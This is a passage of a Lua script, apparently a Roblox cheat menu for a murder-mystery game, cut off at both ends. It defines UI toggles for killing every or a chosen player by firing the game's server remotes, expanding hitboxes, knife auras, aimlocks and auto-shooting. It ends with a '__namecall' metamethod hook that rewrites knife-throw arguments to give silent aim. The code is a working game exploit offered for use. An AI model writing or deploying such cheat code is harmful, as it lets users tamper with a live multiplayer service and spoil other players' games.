    })

Remotes.Gameplay.CoinCollected.OnClientEvent:Connect(function()
    DConfiguration.AutoFarm.FarmingStates.StartFarm = true
end)

Remotes.Gameplay.RoundEndFade.OnClientEvent:Connect(function()
	DConfiguration.AutoFarm.FarmingStates.isMax = true
	DConfiguration.AutoFarm.FarmingStates.StartFarm = false
end)

wait(Duration)

-- Combat

wait(Duration)

Tabs.Combat:AddSection("Innocent")

Tabs.Combat:AddButton({
        Title = "Fake Dead (Sit)",
        Description = "",
        Callback = function()
      LocalPlayer.Character.Humanoid.Sit = true
    end
})

Tabs.Combat:AddButton({
        Title = "Fake Dead (2)",
        Description = "",
        Callback = function()
      LocalPlayer.Character.Humanoid.Sit = true
      LocalPlayer.Character.Humanoid.PlatformStand = true
    end
})

Tabs.Combat:AddButton({
        Title = "Undead",
        Description = "",
        Callback = function()
      LocalPlayer.Character.Humanoid.Sit = false
      LocalPlayer.Character.Humanoid.PlatformStand = false
    end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })

local Toggle = Tabs.Combat:AddToggle("FakeSpeedGlitch", { Title = "Auto Speed Glitch", Default = false })

Toggle:OnChanged(function(Value)
    DConfiguration.Combat.Innocent.SpeedGlitch.Enabled = Value
    
  while DConfiguration.Combat.Innocent.SpeedGlitch.Enabled and wait(0.05) do
      spawn(DFunctions.FakeSpeedGlitch)
    end
    
    if not DConfiguration.Combat.Innocent.SpeedGlitch.Enabled then
	    spawn(DFunctions.FakeSpeedGlitch)
    end
end)

local Toggle = Tabs.Combat:AddToggle("SpeedGlitchButton", {Title = "Speed Glitch Button", Default = false })

Toggle:OnChanged(function(value)
    
  if value then   
       DFunctions.CreateButton("SpeedGlitchButton", "Speed Glitch: OFF", 0.1 + DConfiguration.Settings.GuiScale.SpeedGlitch, 0.1 + DConfiguration.Settings.GuiScale.SpeedGlitch, function(btn)
           DConfiguration.Combat.Innocent.SpeedGlitch.FloatingButton = not DConfiguration.Combat.Innocent.SpeedGlitch.FloatingButton
           btn.Text = DConfiguration.Combat.Innocent.SpeedGlitch.FloatingButton and "Speed Glitch: ON" or "Speed Glitch: OFF"
           
           while DConfiguration.Combat.Innocent.SpeedGlitch.FloatingButton and wait() do
               if not DConfiguration.Combat.Innocent.SpeedGlitch.FloatingButton then
	               LocalPlayer.Character.Humanoid.WalkSpeed = DConfiguration.Misc.LocalPlayer.WalkSpeed.Value
	               break
               end
	           spawn(DFunctions.FakeSpeedGlitch)
           end
           
           if DConfiguration.Combat.Innocent.SpeedGlitch.FloatingButton then
	           spawn(DFunctions.FakeSpeedGlitch)
           end
       end)
    else
        DFunctions.DestroyButton("SpeedGlitchButton")
    end
end)

local Dropdown = Tabs.Combat:AddDropdown("SpeedGlitchType", {
        Title = "Speed Glitch Type",
        Values = {"Walk Speed", "Realistic"},
        Multi = false,
        Default = 1,
    })

    Dropdown:OnChanged(function(Value)
        DConfiguration.Combat.Innocent.SpeedGlitch.Type = Value
    end)

Tabs.Combat:AddInput("GlitchSpeed", {
    Title = "Speed Glitch Speed",
    Default = tostring(DConfiguration.Combat.Innocent.SpeedGlitch.WalkSpeed),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        DConfiguration.Combat.Innocent.SpeedGlitch.WalkSpeed = tonumber(Value) or 30
    end
})

Tabs.Combat:AddInput("SpeedGlitchButtonSize", {
    Title = "Speed Glitch Gui Size",
    Default = tostring(DConfiguration.Settings.GuiScale.SpeedGlitch),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.SpeedGlitch = num * 0.01
        else
            DConfiguration.Settings.GuiScale.SpeedGlitch = 0
        end
    end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })

local Toggle = Tabs.Combat:AddToggle("JumpBoostButton", {Title = "Jump Boost Button", Default = false })

Toggle:OnChanged(function(value)
  if value then   
       DFunctions.CreateButton("JumpBoostButton", "Jump Boost", 0.1 + DConfiguration.Settings.GuiScale.JumpBoost, 0.1 + DConfiguration.Settings.GuiScale.JumpBoost, function(btn)
           btn.Text = "Jumping..."
           DFunctions.JumpBoost(DConfiguration.Combat.Innocent.JumpBoost.Height)
           wait(0.1)
           btn.Text = "Jump Boost"
       end)
    else
        DFunctions.DestroyButton("JumpBoostButton")
    end
end)

Tabs.Combat:AddInput("JumpBoostInput", {
    Title = "Jump Boost Input",
    Default = tostring(DConfiguration.Combat.Innocent.JumpBoost.Height),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        DConfiguration.Combat.Innocent.JumpBoost.Height = tonumber(Value) or 70
    end
})

Tabs.Combat:AddInput("JumpBoostButtonSize", {
    Title = "Jump Boost Button Size",
    Default = tostring(DConfiguration.Settings.GuiScale.JumpBoost),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.JumpBoost = num * 0.01
        else
            DConfiguration.Settings.GuiScale.JumpBoost = 0
        end
        
        DFunctions.UpdateButton("JumpBoostButton", 0.1 + DConfiguration.Settings.GuiScale.JumpBoost, 0.1 + DConfiguration.Settings.GuiScale.JumpBoost)
    end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })

local Toggle = Tabs.Combat:AddToggle("BombTrick", {Title = "Bomb Trick Button", Default = false })

Toggle:OnChanged(function(value)
    if value then   
        DFunctions.CreateButton("BombTrick", "Bomb Clutch", 0.1 + DConfiguration.Settings.GuiScale.BombTrick, 0.1 + DConfiguration.Settings.GuiScale.BombTrick, function(btn)
            btn.Text = "Clutching..."
            spawn(DFunctions.FakeBombClutch)
            
            if DConfiguration.Combat.Innocent.PrankBomb.InCooldown then
	            return
            end
            
            local timeLeft = 20
            while timeLeft > 0 do
                btn.Text = "COOLDOWN "..timeLeft.."s"
                task.wait(1)
                timeLeft -= 1
            end
            
            DConfiguration.Combat.Innocent.PrankBomb.InCooldown = false

            btn.Text = "Bomb Clutch"
        end)
    else
        DFunctions.DestroyButton("BombTrick")
    end
end)

Tabs.Combat:AddInput("BombTrickButtonSize", {
    Title = "Bomb Trick Button Size",
    Default = tostring(DConfiguration.Settings.GuiScale.BombTrick),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.BombTrick = num * 0.01
        else
            DConfiguration.Settings.GuiScale.BombTrick = 0
        end
        
        DFunctions.UpdateButton("BombTrick", 0.1 + DConfiguration.Settings.GuiScale.BombTrick, 0.1 + DConfiguration.Settings.GuiScale.BombTrick)
    end
})

Tabs.Combat:AddSection("Murderer")

local Toggle = Tabs.Combat:AddToggle("KnifeAura", {Title = "Knife Aura", Default = false })

    Toggle:OnChanged(function(value)
        DConfiguration.Combat.Murderer.KnifeAura.Enabled = value
        
    while DConfiguration.Combat.Murderer.KnifeAura.Enabled and wait(0.1) do
        spawn(DFunctions.KnifeAura)
    end
end)

Tabs.Combat:AddInput("KnifeAuraRange", {
        Title = "Knife Aura Range",
        Default = DConfiguration.Combat.Murderer.KnifeAura.Radius,
        Placeholder = "Input",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Murderer.KnifeAura.Radius = tonumber(Value) or 8
        end
    })
    
Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("HitboxExpander", {Title = "Hitbox Expander", Default = false })

    Toggle:OnChanged(function(value)
        DConfiguration.Combat.Murderer.HitboxExpander.Enabled = value
        
    while DConfiguration.Combat.Murderer.HitboxExpander.Enabled and wait(0.1) do
        DFunctions.SetHitbox(DConfiguration.Combat.Murderer.HitboxExpander.Size, true)
    end
    
    if not DConfiguration.Combat.Murderer.HitboxExpander.Enabled then
       DFunctions.SetHitbox(3, false)
    end
end)
    
    
Tabs.Combat:AddInput("HitboxSize", {
        Title = "Hitbox Size",
        Default = DConfiguration.Combat.Murderer.HitboxExpander.Size,
        Placeholder = "5",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Murderer.HitboxExpander.Size = tonumber(Value) or 10
        end
    })
    
Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("Autokillall", {Title = "Auto Kill all", Default = false })

    Toggle:OnChanged(function(value)
        DConfiguration.Combat.Murderer.KillAll = value
        
    while DConfiguration.Combat.Murderer.KillAll and wait(0.1) do
       spawn(DFunctions.KillAllPlayers)
     end
 end)
 
 local Toggle = Tabs.Combat:AddToggle("KillAllButton", {Title = "Kill All Button", Default = false })

Toggle:OnChanged(function(value)
    
  if value then   
       DFunctions.CreateButton("KillAllButton", "Kill All", 0.1 + DConfiguration.Settings.GuiScale.KillAll, 0.1 + DConfiguration.Settings.GuiScale.KillAll, function(btn)
           btn.Text = "Killing..."
           spawn(DFunctions.KillAllPlayers)
           wait(0.1)
           spawn(DFunctions.KillAllPlayers)
           btn.Text = "OOF!!!"
           wait(0.2)
           btn.Text = "Kill All"
       end)
    else
        DFunctions.DestroyButton("KillAllButton")
    end
end)

Tabs.Combat:AddInput("KillAllButtonSize", {
    Title = "Kill All Button Size",
    Default = tostring(DConfiguration.Settings.GuiScale.KillAll),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.KillAll = num * 0.01
        else
            DConfiguration.Settings.GuiScale.KillAll = 0
        end
        
        DFunctions.UpdateButton("KillAllButton", 0.1 + DConfiguration.Settings.GuiScale.KillAll, 0.1 + DConfiguration.Settings.GuiScale.KillAll)
    end
})

Tabs.Combat:AddButton({
	Title = "Kill All",
	Description = "",
	Callback = function()
     spawn(DFunctions.KillAllPlayers)
end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local KillDropdown = Tabs.Combat:AddDropdown("KillDropdown", {
        Title = "Select Player to Kill",
        Values = DFunctions.GetOtherPlayers(),
        Multi = false,
        Default = "",
    })

    KillDropdown:OnChanged(function(Value)
      if Value and Value ~= "" then
           DConfiguration.Combat.Murderer.KillPlayer = Value
        end
    end)
    
    
Tabs.Combat:AddButton({
	Title = "Kill Selected Player",
	Description = "",
	Callback = function()
	    DFunctions.KillTarget(DConfiguration.Combat.Murderer.KillPlayer)
	end
})

Tabs.Combat:AddButton({
        Title = "Refresh Dropdown",
        Description = "",
        Callback = function()
	        KillDropdown.Values = DFunctions.GetOtherPlayers()
	        KillDropdown:SetValue("")
    end
})

Tabs.Combat:AddButton({
	Title = "Kill Sheriff",
	Description = "",
	Callback = function()
     if Roles.Sheriff then
         DFunctions.KillTarget(Roles.Sheriff)
     else
         DFunctions.KillTarget(Roles.Hero)
    end
end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("AutoThrowKnife", {Title = "Auto Throw Knives", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Murderer.KnifeThrow.Automatic = value
    
    while DConfiguration.Combat.Murderer.KnifeThrow.Automatic and wait(0.1) do
       spawn(DFunctions.ThrowKnives)
    end
end)

local Toggle = Tabs.Combat:AddToggle("AutoThrowButton", {Title = "Throw Knives Button", Default = false })

Toggle:OnChanged(function(value)
    
  if value then   
       DFunctions.CreateButton("AutoThrowButton", "Throw Knife", 0.1 + DConfiguration.Settings.GuiScale.ThrowKnife, 0.1 + DConfiguration.Settings.GuiScale.ThrowKnife, function(btn)
           btn.Text = "Throwing..."
           spawn(DFunctions.ThrowKnives)
           wait(0.2)
           btn.Text = "Throw Knife"
       end)
    else
        DFunctions.DestroyButton("AutoThrowButton")
    end
end)


Tabs.Combat:AddInput("ThrowKnifeButtonSize", {
    Title = "Throw Knives Gui Size",
    Default = tostring(DConfiguration.Settings.GuiScale.ThrowKnife),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.ThrowKnife = num * 0.01
        else
            DConfiguration.Settings.GuiScale.ThrowKnife = 0
        end
        
        DFunctions.UpdateButton("ThrowKnifeButton", 0.1 + DConfiguration.Settings.GuiScale.ThrowKnife, 0.1 + DConfiguration.Settings.GuiScale.ThrowKnife)
    end
})

Tabs.Combat:AddParagraph({
        Title = "Settings",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("ThrowAnimation", {Title = "Throw Animation", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Murderer.KnifeThrow.Animated = value
end)

local Toggle = Tabs.Combat:AddToggle("ThrowKnifeWallCheck", {Title = "Wall Check", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Murderer.KnifeThrow.WallCheck = value
end)


Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("ThrowHitbox", {Title = "Throw Hitbox", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Murderer.ThrowHitbox.Enabled = value
end)

local Toggle = Tabs.Combat:AddToggle("IncludeMultiTargets", {Title = "Include Multiple Targets", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Murderer.ThrowHitbox.MultipleTarget = value
end)

Workspace.DescendantAdded:Connect(function(obj)
    if not DConfiguration.Combat.Murderer.ThrowHitbox.Enabled then return end

    local KnifeVisual
    local isThrowingKnife = false

    if obj.Name == "StuckKnife" and obj:IsA("BasePart") then
        KnifeVisual = obj
    elseif obj.Name == "ThrowingKnife" then
        KnifeVisual = obj:FindFirstChild("KnifeVisual") or obj:FindFirstChildWhichIsA("BasePart")
        isThrowingKnife = true
    elseif obj.Name == "KnifeStickWeld" then
        KnifeVisual = obj.Parent
    end

    if not KnifeVisual then return end

    local char = LocalPlayer.Character
    local knife = char and char:FindFirstChild("Knife")
    if not knife then return end

    local radius = DConfiguration.Combat.Murderer.ThrowHitbox.Radius
    local multiple = DConfiguration.Combat.Murderer.ThrowHitbox.MultipleTarget
    local hitTimer = 0 

    task.spawn(function()
        repeat
            local nearestTarget
            local nearestDistance = math.huge

            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and plr.Character then
                    local hum = plr.Character:FindFirstChild("HumanoidRootPart")
                    local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")

                    if hum and humanoid and humanoid.Health > 0 then
                        local distance = (hum.Position - KnifeVisual.Position).Magnitude

                        if distance < radius then
                            if multiple then
                                knife.Events.KnifeStabbed:FireServer()
                                knife.Events.HandleTouched:FireServer(hum)
                                if not isThrowingKnife then
                                    hitTimer = hitTimer + 1
                                end
                            else
                                if distance < nearestDistance then
                                    nearestDistance = distance
                                    nearestTarget = hum
                                end
                            end
                        end
                    end
                end
            end

            if not multiple and nearestTarget then
                knife.Events.KnifeStabbed:FireServer()
                knife.Events.HandleTouched:FireServer(nearestTarget)
                if not isThrowingKnife then
                    hitTimer = hitTimer + 1
                end
            end

            task.wait(0.1)
        until not KnifeVisual.Parent or (not isThrowingKnife and hitTimer >= (multiple and 6 or 3))
    end)
end)

Tabs.Combat:AddInput("ThrowHitboxSize", {
        Title = "Throw Hitbox Size",
        Default = DConfiguration.Combat.Murderer.ThrowHitbox.Radius,
        Placeholder = "3",
        Numeric = false, -- Only allows numbers
        Finished = false, -- Only calls callback when you press enter
        Callback = function(Value)
            DConfiguration.Combat.Murderer.ThrowHitbox.Radius = tonumber(Value) or 10
        end
    })
    
Tabs.Combat:AddSection("Sheriff")

local Toggle = Tabs.Combat:AddToggle("AutoGrabGun", {Title = "Auto Grab Gun", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Sheriff.GunDrop.GrabGun = value
    
    while DConfiguration.Combat.Sheriff.GunDrop.GrabGun and wait(0.1) do
      spawn(DFunctions.GrabGun)
    end
end)
    
 local Toggle = Tabs.Combat:AddToggle("GrabGunButton", {Title = "Grab Gun Button", Default = false })

Toggle:OnChanged(function(value)
    
  if value then   
       DFunctions.CreateButton("GrabGunButton", "Grab Gun", 0.1 + DConfiguration.Settings.GuiScale.GrabGun, 0.1 + DConfiguration.Settings.GuiScale.GrabGun, function(btn)
           btn.Text = "Grabbing..."
           spawn(DFunctions.GrabGun)
           wait(0.2)
           btn.Text = "Grab Gun"
       end)
    else
        DFunctions.DestroyButton("GrabGunButton")
    end
end)

Tabs.Combat:AddInput("GrabGunButtonSize", {
    Title = "Grab Gun Gui Size",
    Default = tostring(DConfiguration.Settings.GuiScale.GrabGun),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.GrabGun = num * 0.01
        else
            DConfiguration.Settings.GuiScale.GrabGun = 0
        end
    end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })

local Toggle = Tabs.Combat:AddToggle("GunDropAura", {Title = "Gun Drop Aura", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Sheriff.GunDrop.Enabled = value
    
 while DConfiguration.Combat.Sheriff.GunDrop.Enabled and wait(0.1) do
      spawn(DFunctions.GunDropAura)
    end
end)

Tabs.Combat:AddInput("RangeGunDropAura", {
    Title = "Gun Drop Range",
    Default = tostring(DConfiguration.Combat.Sheriff.GunDrop.Range),
    Placeholder = "5",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        DConfiguration.Combat.Sheriff.GunDrop.Range = tonumber(Value) or 10
    end
})

wait(Duration)

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("AutoKillMurder", {Title = "Auto Kill Murderer", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Sheriff.KillMurder.Enabled = value
    
 while DConfiguration.Combat.Sheriff.KillMurder.Enabled and wait(3) do
     DFunctions.AutoKillMurderer(DConfiguration.Combat.Sheriff.KillMurder.Type)
   end
end)
    
 local Toggle = Tabs.Combat:AddToggle("KillMurdButton", {Title = "Kill Murder Button", Default = false })

Toggle:OnChanged(function(value)
    
    if value then   
       DFunctions.CreateButton("KillMurderButton", "Kill Murder", 0.1 + DConfiguration.Settings.GuiScale.KillMurder, 0.1 + DConfiguration.Settings.GuiScale.KillMurder, function(btn)
           btn.Text = "Locating..."
           DFunctions.AutoKillMurderer(DConfiguration.Combat.Sheriff.KillMurder.Type)
           wait(0.1)
           btn.Text = "Shooting..."
           wait(0.2)
           btn.Text = "Kill Murder"
       end)
    else
        DFunctions.DestroyButton("KillMurderButton")
    end
end)

Tabs.Combat:AddButton({
        Title = "Kill Murder",
        Description = "",
        Callback = function()
           DFunctions.AutoKillMurderer(DConfiguration.Combat.Sheriff.KillMurder.Type)
        end
    })

Tabs.Combat:AddInput("KillMurdButtonSize", {
    Title = "Kill Murder Gui Size",
    Default = tostring(DConfiguration.Settings.GuiScale.KillMurder),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.KillMurder = num * 0.01
        else
            DConfiguration.Settings.GuiScale.KillMurder = 0
        end
        
        DFunctions.UpdateButton("KillMurderButton", 0.1 + DConfiguration.Settings.GuiScale.KillMurder, 0.1 + DConfiguration.Settings.GuiScale.KillMurder)
    end
})

local Dropdown = Tabs.Combat:AddDropdown("KillMurderType", {
        Title = "Kill Murder Type",
        Values = {"Behind", "Instant Shoot", "Wallbang"},
        Multi = false,
        Default = "Behind",
  })
  
 Dropdown:OnChanged(function(Value)
     DConfiguration.Combat.Sheriff.KillMurder.Type = Value
 end)
   
wait(Duration)

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("ShootButton", {Title = "Shoot Murderer Button", Default = false })

Toggle:OnChanged(function(value)
  if value then   
       DFunctions.CreateButton("ShootButton", "Shoot Murderer", 0.15 + DConfiguration.Settings.GuiScale.ShootMurder, 0.1 + DConfiguration.Settings.GuiScale.ShootMurder, function(btn)
           btn.Text = "Shooting..."
           spawn(DFunctions.ShootGun)
           wait(0.2)
           btn.Text = "Shoot Murderer"
       end)
    else
        DFunctions.DestroyButton("ShootButton")
    end
end)

Tabs.Combat:AddInput("ShootButtonSize", {
    Title = "Shoot Button Size",
    Default = tostring(DConfiguration.Settings.GuiScale.ShootMurder),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.ShootMurder = num * 0.01
        else
            DConfiguration.Settings.GuiScale.ShootMurder = 0
        end
        
        DFunctions.UpdateButton("ShootButton", 0.15 + DConfiguration.Settings.GuiScale.ShootMurder, 0.1 + DConfiguration.Settings.GuiScale.ShootMurder)
    end
  })
  
local Toggle = Tabs.Combat:AddToggle("LookAtMurder", {Title = "Look At Murderer", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Sheriff.Gun.LookAt = value
end)

local Toggle = Tabs.Combat:AddToggle("UnequipGun", {Title = "Unequip Gun", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Sheriff.Gun.UnequipGun = value
end)

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })

local Toggle = Tabs.Combat:AddToggle("AutoShootMurderer", {Title = "Auto Shoot Murderer", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Sheriff.Gun.AutoShoot.Enabled = value
    
    while DConfiguration.Combat.Sheriff.Gun.AutoShoot.Enabled and wait() do
	    spawn(DFunctions.AutoShootGun)
     end
end)

local Dropdown = Tabs.Combat:AddDropdown("AutoShootType", {
        Title = "Auto Shoot Type",
        Values = {"Shoot Murd", "Murderer with a Knife"},
        Multi = false,
        Default = 1,
    })

    Dropdown:OnChanged(function(Value)
        DConfiguration.Combat.Sheriff.Gun.AutoShoot.Type = Value
    end)

Tabs.Combat:AddInput("AutoShootDelay", {
    Title = "Auto Shoot Delay",
    Default = tostring(DConfiguration.Combat.Sheriff.Gun.AutoShoot.Delay),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        DConfiguration.Combat.Sheriff.Gun.AutoShoot.Delay = tonumber(Value) or 0.1
    end
})

local Toggle = Tabs.Combat:AddToggle("AutoShootWallCheck", {Title = "Wall Check", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Sheriff.Gun.AutoShoot.WallCheck = value
end)

Tabs.Combat:AddSection("Aimbots")

local Toggle = Tabs.Combat:AddToggle("AimlockMurderButton", {Title = "Aimlock Murderer Button", Default = false })

Toggle:OnChanged(function(value)
  if value then   
       DFunctions.CreateButton("AimlockMurderButton", "Aimlock Murderer: OFF", 0.1 + DConfiguration.Settings.GuiScale.AimbotMurderer, 0.1 + DConfiguration.Settings.GuiScale.SpeedGlitch, function(btn)
           DConfiguration.Combat.Camera.Aimbot.Enabled1 = not DConfiguration.Combat.Camera.Aimbot.Enabled1
           btn.Text = DConfiguration.Combat.Camera.Aimbot.Enabled1 and "Aimlock Murderer: ON" or "Aimlock Murderer: OFF"
           
           while DConfiguration.Combat.Camera.Aimbot.Enabled1 and RunService.RenderStepped:Wait() do
               spawn(DFunctions.AimlockMurderer)
           end
       end)
    else
        DFunctions.DestroyButton("AimlockMurderButton")
    end
end)

local Toggle = Tabs.Combat:AddToggle("AimlockNearestButton", {Title = "Aimlock Nearest Button", Default = false })

Toggle:OnChanged(function(value)
  if value then   
       DFunctions.CreateButton("AimlockNearestButton", "Aimlock Nearest: OFF", 0.1 + DConfiguration.Settings.GuiScale.AimbotNearest, 0.1 + DConfiguration.Settings.GuiScale.AimbotNearest, function(btn)
           DConfiguration.Combat.Camera.Aimbot.Enabled2 = not DConfiguration.Combat.Camera.Aimbot.Enabled2
           btn.Text = DConfiguration.Combat.Camera.Aimbot.Enabled2 and "Aimlock Nearest: ON" or "Aimlock Nearest: OFF"
           
           while DConfiguration.Combat.Camera.Aimbot.Enabled2 and RunService.RenderStepped:Wait() do
               spawn(DFunctions.AimlockNearest)
           end
       end)
    else
        DFunctions.DestroyButton("AimlockNearestButton")
    end
end)

Tabs.Combat:AddInput("AimlockMurderButtonSize", {
    Title = "Aimlock Button Size (Murderer)",
    Default = tostring(DConfiguration.Settings.GuiScale.AimbotMurderer),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.AimbotMurderer = num * 0.01
        else
            DConfiguration.Settings.GuiScale.AimbotMurderer = 0
        end
        
        DFunctions.UpdateButton("AimlockMurderButton", 0.1 + DConfiguration.Settings.GuiScale.AimbotMurderer, 0.1 + DConfiguration.Settings.GuiScale.AimbotMurderer)
    end
})

Tabs.Combat:AddInput("AimlockNearestButtonSize", {
    Title = "Aimlock Button Size (Nearest)",
    Default = tostring(DConfiguration.Settings.GuiScale.AimbotNearest),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.AimbotNearest = num * 0.01
        else
            DConfiguration.Settings.GuiScale.AimbotNearest = 0
        end
        
        DFunctions.UpdateButton("AimlockNearestButton", 0.1 + DConfiguration.Settings.GuiScale.AimbotNearest, 0.1 + DConfiguration.Settings.GuiScale.AimbotNearest)
    end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
Tabs.Combat:AddParagraph({
        Title = "Settings",
        Content = ""
})

   local Dropdown = Tabs.Combat:AddDropdown("AimPartType", {
        Title = "Select Aim Part",
        Values = {"Head", "Torso", "Prediction"},
        Multi = false,
        Default = "Head",
   })
   
   Dropdown:OnChanged(function(Value)
       DConfiguration.Combat.Camera.Aimbot.AimPart = Value
   end)

Tabs.Combat:AddInput("AimlockSmoothness", {
    Title = "Aimlock Smoothness",
    Default = "0.75",
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        DConfiguration.Combat.Camera.Aimbot.Smoothness = tonumber(Value) or 0.75
    end
})

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
})

local Toggle = Tabs.Combat:AddToggle("FlickShotButton", {Title = "Flick Shot Button", Default = false })

Toggle:OnChanged(function(value)
  if value then   
       DFunctions.CreateButton("FlickShotButton", "Flick Shot", 0.1 + DConfiguration.Settings.GuiScale.FlickShot, 0.1 + DConfiguration.Settings.GuiScale.FlickShot, function(btn)
           btn.Text = "Flicking..."
           wait(0.1)
           spawn(function()
               DFunctions.FlickShoot("Camera", DConfiguration.Combat.Camera.FlickShot.Delay)
           end)
           btn.Text = "Flick Shot"
       end)
    else
        DFunctions.DestroyButton("FlickShotButton")
    end
end)
    
Tabs.Combat:AddInput("FlickShotDelay", {
    Title = "Flick Delay",
    Default = tostring(DConfiguration.Combat.Camera.FlickShot.Delay),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        DConfiguration.Combat.Camera.FlickShot.Delay = tonumber(Value) or 0.1
    end
})

Tabs.Combat:AddInput("FlickShotButtonSize", {
    Title = "Flick Shot Button Size",
    Default = tostring(DConfiguration.Settings.GuiScale.FlickShot),
    Placeholder = "0",
    Numeric = true, 
    Finished = false, 
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.FlickShot = num * 0.01
        else
            DConfiguration.Settings.GuiScale.FlickShot = 0
        end
        
        DFunctions.UpdateButton("FlickShotButton", 0.1 + DConfiguration.Settings.GuiScale.FlickShot, 0.1 + DConfiguration.Settings.GuiScale.FlickShot)
    end
})

Tabs.Combat:AddSection("Mechanic Modification")

local NamecallHook
NamecallHook = hookmetamethod(game, "__namecall", function(self, ...)
    local args = { ... }
    local method = getnamecallmethod()

    if not checkcaller() then

        if self.Name == "KnifeThrown" and method == "FireServer" then
            if not DConfiguration.Combat.SilentAim.Throwing.Enabled then
                return NamecallHook(self, ...)
            end

            local targets = MurderTarget()
            if #targets == 0 then
                return self.FireServer(self, unpack(args))
            end

            local char = LocalPlayer.Character
            local rootPart = char and char:FindFirstChild("HumanoidRootPart")
            if not rootPart then
                return NamecallHook(self, ...)
            end

            local origin = rootPart.Position
            local nearest, nearestDist = nil, math.huge

            for _, t in ipairs(targets) do
                if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") and InCircle(t.Character) then
                    local Root = t.Character.HumanoidRootPart
                    local dist = (origin - Root.Position).Magnitude
                    if dist < nearestDist then
                        nearest = t
                        nearestDist = dist
                    end
                end
            end

            if not nearest then
                return self.FireServer(self, unpack(args))
            end

            local Character = nearest.Character
            local Root = Character.HumanoidRootPart
            local Velocity = Root.AssemblyLinearVelocity
            
            local distance = (origin - Root.Position).Magnitude            
            local AimPos = DFunctions.PredictKnife(Character)
            if AimPos then
                if DConfiguration.Combat.SilentAim.Throwing.ThrowSpeed == "Normal" then
                    args[1] = CFrame.new(origin)
                    args[2] = CFrame.new(AimPos)
                elseif DConfiguration.Combat.SilentAim.Throwing.ThrowSpeed == "Fast" then
                    local fakeOrigin
                    if DFunctions.NotObstructing(Character) then
		                local norm = math.clamp(distance / 150, 0, 1)
		
	                    local t = 0.25 + (0.5 * (norm ^ 0.6))
	                    fakeOrigin = origin:Lerp(Root.Position, t)
                    else
	                    fakeOrigin = origin
                    end
                    
                    args[1] = CFrame.new(fakeOrigin)
                    args[2] = CFrame.new(AimPos)
                elseif DConfiguration.Combat.SilentAim.Throwing.ThrowSpeed == "Instant" then
                    local predict = Root.Position - Root.CFrame.LookVector * 0.9
